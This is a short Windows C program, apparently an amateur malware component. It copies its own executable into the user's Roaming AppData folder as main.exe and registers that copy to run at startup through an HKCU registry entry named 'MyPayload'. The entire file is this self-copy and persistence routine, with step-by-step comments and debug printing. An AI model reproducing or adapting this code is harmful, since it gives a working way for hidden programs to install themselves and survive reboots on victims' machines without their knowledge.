//1. find the appdata

//2. find the where are we

//3. copy to appdata

//4. use hkcu

//5. I apologize for my poor English 

#include <stdio.h>
#include <windows.h> 
#include <shlobj.h>
#include "hkcu.h"
#include <initguid.h>
int main() {
    PWSTR appDataPath = NULL;
    wchar_t currentExePath[MAX_PATH];
    wchar_t destinationPath[MAX_PATH];
//We're locating the AppData folder
    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_RoamingAppData, 0, NULL, &appDataPath);
    if (FAILED(hr)) {
        return 1;
    }
//We're finding our place
    DWORD pathLen = GetModuleFileNameW(NULL, currentExePath, MAX_PATH);
    if (pathLen == 0) {
        CoTaskMemFree(appDataPath); //memory leak fix
        return 1;
    }

    swprintf_s(destinationPath, MAX_PATH, L"%s\\main.exe", appDataPath);
//debug
    if (CopyFileW(currentExePath, destinationPath, FALSE)) {
        wprintf(L"debug: %s\n", destinationPath);

        wprintf(L"error: %lu\n", GetLastError());
        if (SetStartupRegistry(L"MyPayload", destinationPath)) {
            wprintf(L"true.\n");
        } else {
            wprintf(L"debug.\n");
        }

    } else {
        wprintf(L"debug: %lu\n", GetLastError());
    }
    CoTaskMemFree(appDataPath);

    return 0;
}